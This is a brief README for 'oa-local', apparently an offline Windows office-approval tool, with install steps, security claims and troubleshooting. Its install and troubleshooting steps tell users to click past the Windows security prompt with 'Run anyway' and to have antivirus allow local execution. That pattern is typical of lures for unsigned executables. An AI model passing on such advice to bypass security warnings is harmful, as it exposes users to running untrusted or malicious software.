oa-local is a system for managing office approvals on your own computer. It keeps your data safe with strong encryption and works offline. You keep full control over your internal documents.

📦 What is oa-local

This software helps teams handle requests, forms, and approval workflows. Because it runs on your machine, no outside server handles your sensitive files. It uses AES-256 encryption to protect every record stored in your local database. It is built for businesses that prioritize data compliance and privacy.

⚙️ System Requirements

Your computer needs the following to run this software properly:

  • Windows 10 or Windows 11
  • At least 4GB of RAM
  • 500MB of free disk space
  • An active internet connection only for the initial download

🚀 How to Install

Follow these steps to set up the software on your Windows computer:

  1. Visit the releases page to see all available versions.
  2. Look for the file that ends in .exe under the latest release section.
  3. Click the file name to start the download to your computer.
  4. Find the downloaded file in your downloads folder and double-click it.
  5. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system asks.
  6. Follow the setup windows on your screen to complete the installation.
  7. Find the new icon on your desktop and double-click it to start the application.

🛡️ Data Security

Security is the core of this system. Every piece of information enters our encrypted database immediately. You do not need to connect this system to any cloud provider or third-party service. Since all data lives on your hard drive, it complies with strict internal data policies. You own the files and you control the access keys.

📝 Features

  • Offline Capability: Access your records without an internet connection.
  • Strong Encryption: AES-256 standard protects your files from unauthorized access.
  • Simple Dashboard: Manage pending and approved documents from one single window.
  • Compliance Ready: Audit logs keep track of every change made to your documents.

🔧 Troubleshooting

If the application fails to open, ensure your antivirus software allows local execution. Check your Windows version if you experience performance issues. Most problems resolve after a simple restart of the application. If you have trouble finding your database file, check the default folder in your documents directory.
